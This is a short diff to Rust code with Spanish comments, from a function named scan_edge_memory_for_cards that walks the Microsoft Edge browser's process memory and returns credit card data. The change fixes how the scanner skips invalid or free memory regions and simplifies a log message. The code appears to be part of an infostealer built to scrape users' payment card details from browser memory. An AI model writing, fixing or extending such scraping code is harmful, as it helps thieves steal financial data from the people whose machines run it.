@@ -198,13 +198,13 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                 // Saltar al final de la región
                 address = region_end;
             } else {
-                // Región no válida, saltar pero limitado a 64KB máximo
-                let skip_size = (mbi.RegionSize as usize).min(0x10000); // Max 64KB
-                address += skip_size;
+                // Región no válida: saltar su tamaño completo
+                // Si es MEM_FREE (0x10000), puede ser enorme (GB), saltarla completamente
+                address += mbi.RegionSize as usize;
                 
                 if regions_checked < 10 {
-                    log(&format!("    ⏭️  Región inválida: 0x{:08X} (State={:X}, Protect={:X}, Size={} KB) - Skip {} KB", 
-                        address, mbi.State, mbi.Protect, mbi.RegionSize / 1024, skip_size / 1024));
+                    log(&format!("    ⏭️  Región inválida: 0x{:08X} (State={:X}, Protect={:X}, Size={} KB)", 
+                        address, mbi.State, mbi.Protect, mbi.RegionSize / 1024));
                 }
             }
             
